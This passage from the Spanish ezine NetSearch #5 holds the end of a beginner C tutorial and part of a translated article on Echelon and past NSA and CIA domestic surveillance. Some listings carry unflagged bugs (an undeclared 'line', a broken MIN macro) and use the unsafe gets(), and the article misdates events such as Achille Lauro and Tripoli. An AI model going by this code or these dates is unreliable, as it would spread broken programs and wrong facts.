2.- Compila y ejecuta el siguiente programa. (De nuevo, los numeros y los dos
puntos no hacen falta). Que hace el programa? De momento no hace falta que
entiendas nada sobre el codigo fuente ni de este ejercicio ni del resto.

	1: #include <stdio.h>
	2:
	3: int radio, area;
	4:
	5: main()
	6: {
	7:     printf( "Radio del Circulo (p.e. 10): " );
	8:     scanf( "%d", &radio );
	9:     area = (int) (3.14159 * radio * radio);
	10:    printf( "\n\narea = %d\n", area );
	11:    return 0;
	12: }

3.- Que hace el siguiente programa? Compilalo.

	1: #include <stdio.h>
	2:
	3: int x,y;
	4:
	5: main()
	6: {
	7:     for ( x = 0; x < 10; x++, printf( "\n" ) )
	8:         for ( y = 0; y < 10; y++ )
	9:             printf( "X" );
	10:
	11:    return 0;
	12: }

4.- Descubre el fallo del siguiente programa mediante el compilador.

	1: #include <stdio.h>
	2:
	3: main();
	4: {
	5:     printf( "Estate atento!" );
	6:     printf( "I\encontraras el fallo!\n" );
	7:     return 0;
	8: }

5.- Descubre el fallo del programa al compilarlo.
	
	1: #include <stdio.h>
	2:
	3: main()
	4: {
	5:     printf( "Este es un programa con un  " );
	6:     do_it( "gran fallo!");
	7:     return 0;
	8: }

6.- Realiza el siguiente cambio en el codigo del ejercicio 3, y comprueba que
es lo que realiza ahora.

	9: printf( "%c", 1 );


Un pequeño programa en C
------------------------

El siguiente codigo, muestra un programa que sirve para multiplicar dos
numeros.  El programa es muy facil de hacer, y nos servira como principio
para explicar la base de todos los programas de C.

Antes de ver el listado, deberias saber que es una funcion de C, pues es la
base fundamental de la programacion en este lenguaje. Una funcion es una
parte del programa la cual hace una determinada tarea y ha recibido un nombre
especifico.  Haciendo referencia a esa funcion, el programa ejecuta el codigo
correspondiente. El programa tambien podra llamar a la funcion pasandole unos
argumentos, que sirven para pasarle parametros a la funcion (datos que
necesita). A su vez, la funcion tambien nos puede devolver diversos valores.  
Existen dos tipos de funciones: las funciones de libreria, que estan
incluidas en el compilador, y las funciones definidas por el usuario, las
cuales, nosotros como programadores, deberemos implementar. Hay que tener en
cuenta, que las funciones en C, acaban siempre con un punto y coma. (Repito
que los numeros y los dos puntos no son necesarios para compilar el programa)

	Listad0 2.1 MULTIPLY.C.

	1:  /* Programa para calcular el producto de dos numeros */
	2:  #include <stdio.h>
	3:
	4:  int a,b,c;
	5:
	6:  int producto(int x, int y);
	7:
	8:  main()
	9:  {
	10:     /* Primer numero */
	11:     printf("Introduzca un numero entre 1 y 100: ");
	12:     scanf("%d", &a);
	13:
	14:     /* Segundo numero */
	15:     printf("Introduzca otro numero entre 1 y 100: ");
	16:     scanf("%d", &b);
	17:
	18:     /* Calcualar y sacar el resultado */
	19:     c = producto(a, b);
	20:     printf ("%d por %d = %d\n", a, b, c);
	21:
	22:     return 0;
	23: }
	24:
	25: /* La funcion devuelve el resultado del producto de los dos 
	       argumentos */
	26: int producto(int x, int y)
	27: {
	28:     return (x * y);
	29: }
	
	Salida por pantalla:

	Introduzca un numero ente 1 y 100: 35
	Introduzca otro numero entre 1 y 100: 23
	35 por 23 = 805


Componentes de un programa de C
-------------------------------

Las siguientes secciones, describen detalladamente que significa cada cosa
que hemos escrito en el programa anterior. Indico cuales son las lineas de
codigo, para que sea mas facil su lectura.

## La funcion main () { ... } (Lineas 8 hasta la 23)

Es la unica funcion obligatoria en todo programa de C. La forma mas sencilla
de ponerla es main, con dos parentesis () y dos llaves {}. Dentro de las
llaves, sera donde este el cuerpo del programa. Normalmente un programa
empieza con la primera sentencia de main, y acaba con la ultima.

## La directiva #include (Linea 2)

Indica al compilador que debe incluir otro fichero para la ejecucion del
programa. En el se incluyen codigo necesario para el programa. Muchos de
estos ficheros, llamados cabeceras, vienen con el compilador, y son las
librerias de funciones. Normalmente, estas tienen la extension .h Las veremos
con mas detalle en siguientes capitulos.

## La definicion de variables (Linea 4)

Una variable es un nombre asignado a un tipo de dato. Durante un programa, se
usaran muchas variables para almacenar y recuperar datos. Las variables
tienen que definirse antes de poder usarse, para que el compilador sepa el
tamaño y el tipo. En este caso, estamos definiendo tres variables del tipo
int (enteros).

## El prototipo de funcion (Linea 6)

Indica al compilador el nombre y los argumentos de las funciones que hay en
el programa. Debe de aparecer antes de su uso. En la definicion de una
funcion contiene las sentencias del programa.

## Sentencias del programa (Linea 11, 12, 15, 16, 19, 20, 22, y 28)

El verdadero trabajo de un programa de C, lo realizan las sentencias.  
Estas, muestran informacion en el monitor, leen desde el teclado... y hacen
todo tipo de operaciones que el programador necesita para escribir su
programa.  Normalmente, las sentencias se escriben una por linea y acaban con
un punto y coma (;) Las distintas funciones de nuestro programa son:

- printf() Es una funcion de libreria que muestra informacion por pantalla.
Puede mostrar un simple mensaje (linea 11 y 15) o un mensaje con mas valores
(linea 20)

- scanf() Es otra funcion de libreria (ambas se incluyen en la libreria
stdio.h, STanDar Input/Output, que se incluye mediante el #include), que lee
datos desde el teclado y se los asigna a una o mas variables.

-La sentencia de la linea 19, hace una llamada a la funcion producto, es
decir, ejecuta las sentencias que tiene esa funcion. Tambien manda los
argumentos a y b a la funcion, y asigna el valor que retorna la funcion a una
variable c.

- return (Lineas 22 y 28) El return de la linea 28, corresponde a la funcion
producto. Lo que hace es que una vez que ha calculado el valor del producto,
se le asigna a return y es el valor que devuelve dicha funcion. EL return de
la linea 22, devuelve un 0 al SO, antes de acabar el programa.
	
## Definicion de funciones (Lineas 26 a 29)

Una funcion es completamente independiente del resto del programa, y puede
ser utilizada en muchos otros programas, sin cambiar su codigo. Toda funcion
tiene un nombre, y se ejecuta incluyendo el nombre en alguna sentencia. La
funcion producto () es una funcion definida por el usuario. Normalmente no
crearemos funciones tan sencillas, ya que suelen estar ya implementadas en C.

## Comentarios (Lineas 1, 10, 14, 18, y 25)

Todo lo que empieza por /* y acaba por */ son comentarios. Estos sirven para
poner indicaciones en el codigo del programa, pero a la hora de compilarlos,
el compilador no les prestara atencion y pasara de ellos. Sirven para
detallar un programa, cuando suele ser bastante complicado de leer. Es muy
aconsejable empezar desde ahora mismo a incluir comentarios en el codigo,
pues cuando hagamos proyectos mayores, si no tenemos comentarios,
posiblemente nos perdamos.

Es posible poner comentarios de la forma usada en C++, que serian dos barras
( // ). En este caso, no habria que indicar el fin de comentario, pues se
toma el fin de linea a tal efecto.

Tambien es posible en algunos compiladores poner comentarios anidados, (unos
comentarios dentro de otros comentarios) pero lo desaconsejo totalmente, por
eso no hare mas comentarios sobre la anidacion de comentarios (Deberia
volverme comentarista xD).

## Llaves {} (Lineas 9, 23, 27 y 29)

Se encierran entre llave, todas aquellas sentencias que forman parte de la
misma funcion, incluyendo la funcion main (). Tambien, un grupo de 1 o mas
sentencias entre llaves, es un bloque.


Ejecutando el programa
------------------------

Escribe y compila el programa multiply.c, para ir acostumbrandote a tu
entorno de desarrollo. Un ordenador, es lo mas estupido que hay, pues solo
hace lo que le mandas. Si cometes un fallo, por pequeño que sea, no sabe como
corregirlo, por eso debes acostumbrarte a hacer las cosas bien desde el
principio.
	

Revision de las partes de un programa
-------------------------------------

Ahora que mas o menos sabemos cuales son las partes de un programa, podremos
identificarlas facilmente...


1:  /* LISTADO.C--Muestra un archivo con el numero de linea! */
2:  #include <stdio.h>
3:  #include <stdlib.h>
4:
5:  void display_usage(void);
6:  int linea;
7:
8:  main( int argc, char *argv[] )
9:  {
10:    char buffer[256];
11:    FILE *fp;
12:
13:    if( argc < 2 )
14:    {
15:       display_usage();
16:       exit(1);
17:    }
18:
19:    if (( fp = fopen( argv[1], "r" )) == NULL )
20:    {
21:         fprintf( stderr, "Error abriendo el archivo, %s!", argv[1] );
22:         exit(1);
23:    }
24:
25:    line = 1;
26:
27:    while( fgets( buffer, 256, fp ) != NULL )
28:       fprintf( stdout, "%4d:\t%s", linea++, buffer );
29:
30:    fclose(fp);
31:    return 0;
32: }
33:
34: void display_usage(void)
35: {
36:       fprintf(stderr, "\nUso del fichero: " );
37:       fprintf(stderr, "\n\nLISTADO nombre.ext\n" );
38: }
	
	Salida por pantalla

C:\>list_it list_it.c

1:  /* LISTADO.C--Muestra un archivo con el nomero de lðnea! */
2:  #include <stdio.h>
3:  #include <stdlib.h>
4:
5:  void display_usage(void);
6:  int linea;
7:
8:  main( int argc, char *argv[] )
9:  {
10:    char buffer[256];
11:    FILE *fp;
12:
13:    if( argc < 2 )
14:    {
15:       display_usage();
16:       exit(1);
17:    }
18:
19:    if (( fp = fopen( argv[1], "r" )) == NULL )
20:    {
21:         fprintf( stderr, "Error abriendo el archivo, %s!", argv[1] );
22:         exit(1);
23:    }
24:
25:    line = 1;
26:
27:    while( fgets( buffer, 256, fp ) != NULL )
28:       fprintf( stdout, "%4d:\t%s", linea++, buffer );
29:
30:    fclose(fp);
31:    return 0;
32: }
33:
34: void display_usage(void)
35: {
36:       fprintf(stderr, "\nUso del fichero: " );
37:       fprintf(stderr, "\n\nLISTADO nombre.ext\n" );
38: }


Analisis a este programa:

Este programa es bastante facil de analizar. Como siempre, esta la
obligatoria funcion main () en la linea 8 hasta la 32. Las lineas dos y tres,
son directivas include. La declaracion de variables se realiza en las lineas
6, 10 y 11. El prototipo de la funcion void display_usage (void), esta en la
linea 5. El programa tienen muchas sentencias (lineas 13, 15, 16, 19, 21, 22,
25, 27, 28, 30, 31, 36, y 37). La definicion de la funcion void display_usage
(void), abarca desde la 34 hasta la 38. Las llaves, abarcan diversos bloques
a lo largo del programa. Finalmente, tenemos una linea de comentario en la 1.

Listado.c, realiza una sola llamada a una funcion definida por el usuario
void display_used (void). El resto, son todas funciones de libreria, como
exit (); fopen(); fprintf(); fgets(); fclose(). Estas funciones de libreria
las veremos mas adelante.


Ejercicios
----------

1.-	Escribe el programa mas pequeño posible.

2.-	Segun el siguiente programa:

	1:  /* EX2-2.C */
	2:  #include <stdio.h>
	3:
	4:  void display_line(void);
	5:
	6:  main()
	7:  {
	8:      display_line();
	9:      printf("\n Programacion en C by JohnnyG!\n");
	10:     display_line();
	11:
	12:     return 0;
	13: }
	14:
	15: /* Imprime linea de asteriscos */
	16: void display_line(void)
	17: {
	18:     int cont;
	19:
	20:     for( cont = 0; cont < 21; cont++ )
	21:         printf("*" );
	22: }
	23: /* Fin del programa */

	Identifica todas las partes que tiene.

3.-	Que realiza el siguiente programa? Compilalo para saberlo.
	
	1: /* EX2-4.C */
	2: #include <stdio.h>
	3:
	4: main()
	5: {
	6:     int ctr;
	7:
	8:     for( ctr = 65; ctr < 91; ctr++ )
	9:         printf("%c", ctr );
	10:
	11:    return 0;
	12: }
	13: /* Fin del programa */

4.- 	Compila y ejecuta el siguiente programa.
	
	1: /* EX2-5.C */
	2: #include <stdio.h>
	3: #include <string.h>
	4: main()
	5: {
	6:     char buffer[256];
	7:
	8:      printf( "Escribe tu nombre y pulsa <Enter>:\n");
	9:      gets( buffer );
	10:
	11:     printf( "\nTu nombre tiene %d caracteres y espacios!",
	12                        strlen( buffer ));
	13:
	14:     return 0;
	15: }


/* A partir de ahora es cuando empieza realmente lo que es programar... */

/* Recordar que C es sensible a las mayusculas y minusculas */

/* Distingue entre ellas */


El preprocesador.
-----------------

Es un editor de textos especializado. No forma parte del compilador. Nos
permite incluir en el codigo fuente instrucciones para el compilador. Para
incluir esas directivas, usamos el #. Se distinguen dos tipos de ordenes:  
las directivas y las pragmas.

 * Directivas : Indican al preprocesador que realice alguna operacion sobre
el programa fuente que estamos escribiendo.

 * Pragmas : Indican al compilador que realice alguna accion especial en
tiempo de compilacion.

El preprocesador se ejecuta antes que el compilador. Primero se modifica lo
que le indiquemos al preprocesador, y luego se compila normalmante.


Directivas
----------

 * #include Al comienzo del fichero. Sirve para indicar el fichero cabecera
entre < > o " ". Busca el fichero cabecera y lo incluye en ese punto. El
orden o secuencia donde lo busca depende de si hemos usado < > o " ", y del
compilador y sistema operativo. Tambien es posible indicar la ruta exacta
donde esta el fichero. No es conviniente incluir codigo en los ficheros
cabecera (es aconsejable que los que hagamos nosotros, solo contengan
variables, estructuras..). Pueden estar anidados (incluir los archivos
cabecera otros include).

        1: #include <stdio.h> /* STanDar Input/Output */

 *  #define      Definimos un identificador y una cadena. 

	1: #define PI 3.14159

El preprocesador busca todas las ocurrencias del identificador en el fichero
y lo sustituye por la cadena.

	1: #define UNO 1
	2: #define DOS UNO+UNO

Se pueden incluir otros identificadores dentro del define. Tambien es posible
que los defines reciban parametros.

        1: #define MIN(a,b)  (a<b)  a : b
	2: main ( )
	3: {
        4:   int x, y;
	5:   x = 10;
	6:   y = 20;
	7:   printf ("El minimo es %d", MIN (x,y));
	8: }

En C, todo el codigo esta dentro de funciones. Hay una funcion main, que es
la que se ejecuta al arrancar el programa, y debe estar siempre presente.
Todas las funciones tiene que estar al mismo nivel. No es posible definir una
funcion dentro de otra. Las funciones estan formadas por instruciones. Todas
las instrucciones en C deben de acabar en punto y coma ( ; )

Las ventajas del #define respecto a las funciones es que es mas rapido, pero
el codigo fuente se hace mas grande.

Las definiciones de cadenas deben de ir siempre entre comillas dobles, y si
son un solo caracter, con una comilla simple. Al no pertenecer #define ni
#include al propio codigo de C, sino al preprocesador, no acaban en punto y
coma, y no son sensibles a las mayusculas y minusculas. De no caber la cadena
en una sola linea, debe usarse el caracter \ y saltar de linea.

	1: #define CADENA 	"Esta es una cadena muy larga \
	2:        		para entrar en una linea"


Mapa de memoria en C
--------------------

El lenguaje C, divide la memoria que utiliza el programa en 4 partes:

 *    Pila
 *    Monton
 *    Variables Globales
 *    Codigo de Programa

El orden y la zona de memoria que ocupe siempre dependera del sistema
operativo que estemos utilizando, pero siempre habra esas 4 regiones de
memoria.

 * Codigo de programa: Es el programa en si. Depende del tamaño del
ejecutable y es fijo.

 * Variables globales: Aquellas que se pueden acceder desde cualquier punto
del programa. Se crean nada mas que empieza el programa y se destruyen cuando
finaliza la ejecucion. Es de longitud fija.

 * Monton: No tiene una longitud fija. Se usa para la signacion dinamica de
memoria (listas enlazadas, grafos...).

 * Pila: Se guardan los valores de las variables locales. Se crean cuando se
ejecuta la funcion que las contiene y se destruyen cuando esta acaba,
devolviendo el control al programa padre (El que lo llama). La longitud es
variable. Tambien se guarda en esta region la direccion de retorno de una
funcion.


Estructura general de una programa en C
---------------------------------------

Todo debe de estar incluido dentro de funciones. Hay una unica funcion con
nombre especial, main, que es la funcion principal. Se ejecuta segun se
arranca el programa. Puede tener codigo o no (suele ir entre llaves el
codigo) y puede llamar a otras funciones. Es la unica funcion que debe
incluirse siempre.

	1: #include <stdio.h>
	2: main ( )
	3: {
	4:    /*  Cuerpo del programa */
	5:	 func1( );
	6:	 /*   comentarios */
	7: }
	8:
    	9: func1( )
    	10: {
    	11:	...
    	12: }

Las funciones siempre empiezan y terminan con llaves. Las funciones siempre
que devuelvan un valor asociado a su nombre, se debe indicar. Sino se indica
nada, se toma por defecto un valor int (entero). Si no devuelve ningun valor,
se debe poner void (vacio, nulo). No importa el orden en el que se declaren
las funciones. Un programa grande, normalmente no estara contenido solo en un
fichero. C permite la division en varios modulos. Los modulos pueden tener
variables locales al modulo y exportables fuera de el, igual que las
funciones.

..


[ Nota de editor: En NetSearch #6 se publicara la segunda parte de este 
                  articulo. ]


/* Para cualquier duda johnny_g@usa.com */
/* JohnnyG */



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x13 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Proyecto Echelon (2/2) ]-================================================
=-[ por Pope ]-==============================================================




==========================
0. AQUI ESTAMOS OTRA VEZ
==========================


	Como se que esperabais con ansia este momento ;-) aqui teneis la 2ª
parte del articulo sobre Echelon, la red de espionaje mas grande y potente
del mundo. Como ya comente en NS #4, este documento es una traduccion del
original en ingles, que se puede encontrar en
http://fly.hiwaay.net/~pspoole/echelon.html , pagina cuyo autor (Patrick S.
Poole, pspoole@hiwaay.net ) adereza con multitud de recursos (links, notas de
prensa, informes oficiales, etc.) acerca de este gran hermano con nombre
propio. Por supuesto, esta traduccion la he hecho y la publicamos habiendo
pedido previamente consentimiento al sr. Poole (como ya comente, estuvo
encantado con la idea; asi da gusto...).

	En esta parte del articulo encontrareis interesantes reflexiones
acerca de la utilidad de Echelon en la actualidad, asi como multitud de
antecedentes de EEUU en espionaje con beneficios comerciales o politicos.
Sencillamente escalofriante. Todo ello, siguiendo la buena costumbre del
autor, acompañado de multitud de enlaces "con nombre y apellido", apoyando la
informacion que aqui se recoge.

	Aquellos que no hayais leido la primera parte del articulo, podeis
consultarla en http://www.netsearch-ezine.com , en el #4. Poco mas tengo que
decir, simplemente espero que cuando termineis con esto seais un poco mas
conscientes del control al que se nos somete cada dia, un control que viola
todos y cada uno de los derechos mas elementales (privacidad, intimidad,
presuncion de inocencia) de las leyes de nuestro pais e incluso puntos de la
constitucion de EEUU.

	Por cierto, os he mantenido la numeracion de los capitulos siguiendo
a la del numero anterior. Comentarios, criticas, sugerencias, etc., como
siempre, a pope@netsearch-ezine.com.


================
4. EL PROBLEMA
================


	El sistema Echelon es fruto del conflicto de la Guerra Fria, todo un
desagradable enfrentamiento, repleto de demostraciones de fuerza y señales de
hostilidad. Circulos viciosos de desconfianza y paranoia entre Estados Unidos
y la Union Sovietica, que hicieron crecer los servicios de inteligencia,
hasta la caida de la URSS. Llegado este momento, las agencias se vieron en la
necesidad de justificar su control, "inventando" razones que hicieran parecer
razonable su poder sobre el resto del mundo.

	Pero, con el aumento del terrorismo moderno, los servicios de
inteligencia de cada pais tuvieron motivos de sobra para justificar el
espionaje a sus paises enemigos, asi como a sus aliados e incluso a sus
propios ciudadanos, y continuar el desarrollo de estos sistemas. El resultado
de estos hechos tiene nombre propio: Echelon. Satelites volando a miles de
kilometros de altura, que pueden examinar cada detalle del Planeta;
submarinos secretos bajo el mar, capaces de pinchar las lineas de
comunicaciones submarinas [31]... todo ello coordinado por los servicios de
los paises de la alianza UKUSA.

[31] "The ties that bind: Intelligence cooperation between the UKUSA
countries" ("Lazos fuertes: cooperacion de inteligencia entre los paises de
UKUSA"). Desmond Ball y Jeffrey Richelson. Boston: Allen & Unwin, 1.985.
pp. 223-224
http://www.amazon.com/exec/obidos/ASIN/0045200092/qid=909414912/ [SIGUE]
sr=1-11/002-3166366-4403036

	Estan constatados los esfuerzos de los directores de servicios de
inteligencia, dirigentes de las fuerzas de seguridad y representantes
politicos por defender las cualidades de Echelon. Se esgrimen como argumentos
los atentados de Oklahoma y el World Trade Center en Nueva York; tambien se
justifican exponiendo la vulnerabilidad de los norteamericanos en el
extranjero, poniendo como ejemplos los atentados en las embajadas
estadounidenses en Dar es Salaam (Tanzania) y Nairobi (Kenia), como razones
adicionales para controlar a grupos o regiones susceptibles de utilizar la
violencia y el terror como armas politicas en contra de los EEUU y sus
aliados.

	Las victorias de los servicios de inteligencia norteamericanos
parecen justificar este control: el descubrimiento de los silos de misiles
cubanos en 1.962, la captura de los terroristas del Achille Lauro en 1.995,
la investigacion que desvelo la implicacion de Libano en el bombardeo de una
discoteca en Berlin (donde murio un estadounidense; fue respondido con el
bombardeo de Tripoli en 1.996)... estos y muchos otros incidentes, ahora
tratados como alto secreto, parecen puntos a favor del control de EEUU.

	Pero, a pesar de la amenaza potencial que el terrorismo moderno
representa para Norteamerica, dentro y fuera de su territorio nacional, la
constitucion estadounidense limita explicitamente el alcance y poderes del
gobierno. Un axioma de las sociedades libres es que, cuando se discrepa sobre
los poderes del estado, nunca se depositan sistematicamente en el propio
gobierno, ni se autorizan sin hacerlo publico previamente. Segun dicto el
ultimo Juez del Tribunal Supremo, William Brenan:

	"El concepto de 'necesidad militar' es de una elasticidad tentadora.
A menudo se argumentas razones de seguridad para justificar un recorte de las
libertades civiles. Por esta razon, debemos tratar este termino con cierto
escepticismo: por su gravedad, en las Cortes somos cuidadosos cuando el
Gobierno invoca la necesidad militar para justificar la violacion de derechos
[constitucionales]". [32]

[32] Brown v. Glines, Ley 444 U.S. 348 (1.980).
http://laws.findlaw.com/US/444/348.html

	A pesar de la necesidad de frenar el terrorismo, y los beneficios
reportados a EEUU por la observacion desde Echelon, el Proyecto tiene un lado
oscuro, dado el caracter secreto que rodea las operaciones de inteligencia de
su gobierno.

	El descubrimiento de observaciones centradas en ciudadanos
norteamericanos, alegando "dudosas afiliaciones politicas" (sin ninguna
causa, probablemente), en violacion de las Enmiendas Primera, Cuarta y Quinta
de la Constitucion Estadounidense, se rebate a menudo con complejos
argumentos legales y aparentes privilegios alegados por los servicios de
inteligencia y el gobierno estadounidense. Los supuestos encargados de velar
por las libertades de los norteamericanos -representantes politicos
debidamente elegidos- apenas prestan atencion a los hechos, pasando por alto
los abusos que tienen ante sus ojos. Como se comenta mas abajo, los propios
politicos son a veces objetivos de Echelon, mermando asi sus posibilidades de
entrometerse en el Proyecto.

	Mas aun: a raiz del cambio en las prioridades de EEUU tras la caida
del imperio sovietico, se redefinieron los "intereses de la seguridad
nacional" para incluir el espionaje en beneficio de grandes compañias
americanas. Esta especie de colision entre intereses politicos y privados
suele beneficiar a las mismas compañias que desarrollan los sistemas de
Echelon.


4.1. Espionaje nacional y politico
------------------------------------


	Dados los precedentes de las actividades de la NSA y la CIA en
territorio nacional, infringiendo las libertades constitucionales y los
derechos a la privacidad en este pais, no es dificil suponer que el resultado
sera el mismo en tanto se espie con Echelon el territorio nacional. Desde la
creacion de la NSA, su capacidad de espionaje ha sido usada frecuentemente
para monitorizar objetivos inocentes, como veremos en algunos antecedentes.


4.1.1. Proyecto SHAMROCK

	En 1.945 se inicio este proyecto, que tenia como mision obtener
copias de toda la informacion que saliera o entrara en EEUU por telegrafo.
Contando con la colaboracion de RCA, ITT y Western Union (responsables de
casi todo el trafico telegrafico estadounidense en aquellas fechas), la
predecesora de la NSA y despues la propia NSA obtenian microfilmes diarios de
todos los telegramas que entraban, salian o atravesaban EEUU. La eficiencia
del sistema aumento increiblemente cuando las compañias de cable comenzaron a
pasar la informacion a la agencia en cintas magneticas, siendo asi posible
procesarlas en el sistema HARVEST en busca de palabras, lugares o personas
concretas.

	SHAMROCK tuvo tanto exito que en 1.966 la NSA y la CIA levantaron
nuevas instalaciones en Manhattan (sede de las oficinas de las compañias
telegraficas) con el nombre en clave de LPMEDLEY.  Bajo el proyecto SHAMROCK,
los agentes de la NSA imprimian y analizaban 150.000 mensajes cada mes [33].

[33] "The Puzzle Palace: Inside the National Security Agency, America's Most
Secret Intelligence Organization" ("El palacio del rompecabezas: dentro de la
NSA, el servicio de inteligencia mas secreto de America"). James Bradford.
New York: Penguin Books, 1.983. pp. 314, 459.
http://www.amazon.com/exec/obidos/ASIN/01460067485/qid=909414754/ [SIGUE]
sr=1-2/002-3166366-4403036

	Lew Allen, director de la NSA en 1.975, detuvo el proyecto en mayo
del mismo año, a raiz de las criticas que empezaban a surgir en el Congreso.
Tras el testimonio de los directores de las compañias telefonicas y del
director Allen, el senador Frank Church del Comite de Inteligencia del Senado
concluyo que SHAMROCK era "probablemente el mas grande programa gubernamental
de intercepcion sobre norteamericanos jamas llevado a cabo" [34].

[34] Programa de observacion externa: Senado de EEUU, Comite de Investigacion
de Inteligencia, informes detallados sobre inteligencia y los derechos de los
norteamericanos. Informe final, libro tercero, 23 de abril de 1.976, p. 765.


4.1.2. Proyecto MINARET

	Similar a SHAMROCK, este proyecto consistio en la elaboracion de
"listas de observacion" por parte del FBI y los servicios de inteligencia, de
los ciudadanos acusados de actividades nacionales "subversivas". La lista
incluia personas tan notables como Martin Luther King, Malcolm X, Jane Fonda,
Joan Baez y el Dr. Benjamin Spock.

	En 1.972 el Tribunal Supremo de EEUU dicto la sentencia Keith [35],
donde se sostiene que -aunque el presidente podia luchar para proteger su
pais de actividades irregulares y subversivas que pudieran desbordar a su
gobierno- su poder no le permitia el espionaje electronico de las
organizaciones; tras esta sentencia empezo a crecer la presion sobre el
proyecto MINARET [36]. En cuanto las actividades de este proyecto llegaron a
oidos del poder judicial, el Presidente del Consejo del Poder Judicial,
Elliot Petersen, ordeno el cierre de este proyecto, a pesar de que el FBI
(agencia bajo la autoridad del Departamento de Justicia) estaba involucrada
activamente en la elaboracion de las listas, conjuntamente con la NSA y el
resto de las agencias.

[35] "EEUU contra la Corte del Distrito de EEUU". Ley 407 US 297 de 1.972.
http://laws.findlaw.com/US/407/297.html

[36] "Puzzle Palace", pp. 370-373. Ver nota [33].

	MINARET estuvo en funcionamiento entre 1.967 y 1.973, y en sus listas
se incluyeron cerca de 7.000 organizaciones y ciudadanos, tanto
estadounidenses como extranjeros. A pesar de los esfuerzos por encubrir el
papel de la NSA en MINARET, el director de la agencia de seguridad, Lew
Allen, testifico con anterioridad al Comite de Inteligencia del Senado de
1.975, informando de que la NSA habia realizado unos 3.900 informes sobre
ciudadanos norteamericanos incluidos en las listas [37]. Ademas, la Oficina
de Servicios de Seguridad de la NSA mantuvo informes sobre al menos 75.000
ciudadanos de EEUU entre 1.952 y 1.974, incluyendo todos aquellos que
figuraban en cualquier mensaje interceptado por la NSA.

[37] "Puzzle Palace", p. 381. Ver nota [33].


4.1.3. Operacion CHAOS

	Mientras la NSA espiaba a los ciudadanos norteamericanos con los
proyectos SHAMROCK y MINARET, la CIA se introdujo en el espionaje nacional
con la operacion CHAOS. El presidente Lyndo Johnson autorizo la creacion de
la Division de Operaciones Nacionales (DOD, Domestic Operations Division) de
la CIA, que tenia como proposito "ejercer las responsabilidades centralizadas
para la direccion, el apoyo y la coordinacion de actividades y operaciones
clandestinas en el territorio nacional".

	Cuando Johnson ordeno al director de la CIA, John McCone, el uso de
la DOD para observar la creciente oleada de protestas de estudiantes contra
el comportamiento de la administracion hacia Vietnam, se crearon dos nuevas
unidades para el control de los manifestantes y organizaciones pacifistas: el
proyecto RESISTANCE, que contaba con la colaboracion de las administraciones
de las universidades, centros de seguridad de los campus y policia local para
identificar activistas en contra de la guerra y disidentes politicos; y el
proyecto MERRIMAC, que monitorizaba cualquier manifestacion en el area de
Washington DC. Entonces, la CIA empezo a controlar a los estudiantes
activistas, y a infiltrarse en organizaciones antiguerra cooperando con la
policia local para evitar todo tipo de altercados de importancia [38].

[38] "The lawless state" ("El estado sin ley"). Morton Halperin, Jerry Berman
y otros. Penguin: New York, 1.976. p. 146

	A la llegada al poder de Nixon en 1.969, todas estas actividades de
espionaje se englobaron en la llamada operacion CHAOS. Tras el descubrimiento
de la implicacion de dos agentes de la CIA en el escandalo Watergate, la
publicacion de un articulo sobre CHAOS en el New York Times [39] y la
intencion de la CIA de distanciarse del espionaje ilegal nacional, la
operacion se cerro. Pero durante su actividad, segun revelaron el Comite de
la Iglesia y la Comision para la Investigacion de las Actividades de la CIA
en Territorio Nacional (comision Rockefeller), la CIA realizo 13.000
informes, entre ellos 7.000 sobre ciudadanos estadounidenses y 1.000 sobre
organizaciones nacionales [40].

[39] "Huge CIA operation reported in U.S. against antiwar forces"
("Importante operacion de la CIA contra las fuerzas antiguerra"). Seymour
Hersh. New York Times, 22 de diciembre de 1.974, p. 1.

[40] "The lawless state", p. 153 (ver nota [38]).
Informe a la presidencia. Comision de los EEUU para la Investigacion de las
Actividades en Territorio Nacional. Imprentas del gobierno, Washington
DC, 1.975, p. 144n3


4.1.4. FISC

	En respuesta al descubrimiento de las administraciones anteriores y
de las agencias de inteligencia, el Congreso aprobo una ley (el Acta sobre
Observacion de los Servicios de Inteligencia Extranjeros, de 1.978 [41])
segun la cual se creo un comite de alto secreto -el FISC, Foreign
Intelligence Surveillance Court, Tribunal sobre la Observacion de los
Servicios de Inteligencia- al que el FBI y la NSA expondrian sus actividades,
para suavizar los abusos de la observacion en territorio nacional.

[41] Ley 50 USC sec. 1.801 y siguientes.
http://www.law.cornell.edu/uscode/50/ch36.html

	Este tribunal, formado por 7 jueces elegidos por el Presidente del
Tribunal Supremo, se reune en secreto en la ultima planta de la sede del
Departamento de Justicia. Apenas hay informacion publica sobre las vistas de
este tribunal; cada año, por ley, el Presidente del Consejo del Poder
Judicial debe informar al Congreso sobre las vistas que se han solicitado a
su Tribunal, y cuantas de ellas han sido aceptadas. Durante los ultimos 20
años se han solicitado 10.000 vistas, de las cuales solo una fue rechazada (a
peticion de la Administracion Reagan, el mismo organismo que anteriormente
habia cursado la peticion).

	Aunque el FISC nacio para velar por los derechos constitucionales de
los estadounidenses y defenderlos del espionaje nacional, pronto se convirtio
en el "perrito faldero" de los servicios de inteligencia. Peticiones que
jamas habrian sido aceptadas en los tribunales eran aprobadas tranquilamente
en el FISC. A raiz de esto el FBI investigo al FISC en busca de evidencias de
violaciones de la Constitucion para poder desautorizar este organismo. Pero
la propia investigacion se ve dificultada por el caracter secreto de este
tribunal [42]. A pesar de las intenciones que el Congreso plasmo en el FISC,
resulta dificil creer que las investigaciones de Echelon vayan a ser
cuestionadas por este tribunal.

[42] Mas informacion sobre el FISC en este ensayo: "Inside America's Secret
Court: The Foreign Intelligence Surveillance Court" ("Dentro del tribunal
secreto de America: el Tribunal de Observacion de los Servicios de
Inteligencia Extranjeros"). The privacy papers (documentos sobre la
privacidad), nº 2 (Washington DC: Free Congress Foundation, 1.998).
http://www.freecongress.org/ctp/fiscshort.html


4.2. Usos politicos de Echelon y UKUSA
----------------------------------------


	De la alianza UKUSA han derivado multitud de incidentes sobre
espionaje en los que Echelon esta involucrado. No es dificil darse cuenta de
que, por encima de las buenas intenciones de los representantes politicos,
ministros o presidentes, la tentacion de usar Echelon como una herramienta
para la represion y el beneficio politico es muy fuerte.

	El ex-espia canadiense Mike Frost cuenta como la antigua Primera
Ministra de Gran Bretaña, Margaret Thatcher, solicito en febrero de 1.983 que
se espiara a dos ministros de sus gobiernos, sospechando ella que le eran
desleales. Para sortear las dificultades legales en torno al espionaje en
territorio nacional, el GHCQ britanico solicito al CSE canadiense
